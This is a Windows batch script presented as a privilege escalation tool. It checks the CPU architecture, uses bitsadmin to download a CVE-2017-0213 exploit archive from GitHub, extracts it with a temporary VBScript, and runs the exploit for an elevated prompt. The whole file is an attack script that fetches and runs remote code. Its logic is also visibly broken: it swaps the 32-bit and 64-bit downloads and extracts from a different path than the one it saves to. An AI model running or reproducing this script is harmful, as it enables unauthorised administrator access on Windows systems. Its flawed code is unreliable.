@echo off
cls
echo.
title Privilige Escalation on Windows
echo ---------------------------------------------------------------
echo  Microsoft Windows Privilige Escalation // Google Project Zero
echo ---------------------------------------------------------------
echo.

echo [+] Detecting CPU Architecture
if %PROCESSOR_ARCHITECTURE%==AMD64 (echo [+] Detected 64bit Architecture) else (echo [+] Detected 32bit Architecture)
echo.
echo Downloading %PROCESSOR_ARCHITECTURE% Exploit
timeout 10 /nobreak
:: Download the correct version of exploit
if %PROCESSOR_ARCHITECTURE%==AMD64 (bitsadmin.exe /transfer "Downloading Exploit" "https://github.com/WindowsExploits/Exploits/raw/master/CVE-2017-0213/Binaries/CVE-2017-0213_x86.zip" "C:\Users\%username%\exploit.zip") else (bitsadmin.exe /transfer "Downloading Exploit" "https://github.com/WindowsExploits/Exploits/raw/master/CVE-2017-0213/Binaries/CVE-2017-0213_x64.zip" "C:\Users\%username%\exploit.zip")
:: Call the Extract
Call :UnZipFile "C:\Users\%username%\Desktop\" "C:\Users\%username%\Desktop\exploit.zip"
:: Execute Exploit to get prompt
if %PROCESSOR_ARCHITECTURE%==AMD64 ("C:\Users\%username%\Desktop\CVE-2017-0213_x64.exe") else ("C:\Users\%username%\Desktop\CVE-2017-0213_x86.exe")


:: UNZIP A FILE
:UnZipFile <ExtractTo> <newzipfile>
set vbs="%temp%\_.vbs"
if exist %vbs% del /f /q %vbs%
>%vbs%  echo Set fso = CreateObject("Scripting.FileSystemObject")
>>%vbs% echo If NOT fso.FolderExists(%1) Then
>>%vbs% echo fso.CreateFolder(%1)
>>%vbs% echo End If
>>%vbs% echo set objShell = CreateObject("Shell.Application")
>>%vbs% echo set FilesInZip=objShell.NameSpace(%2).items
>>%vbs% echo objShell.NameSpace(%1).CopyHere(FilesInZip)
>>%vbs% echo Set fso = Nothing
>>%vbs% echo Set objShell = Nothing
cscript //nologo %vbs%
if exist %vbs% del /f /q %vbs%
EXIT /B 0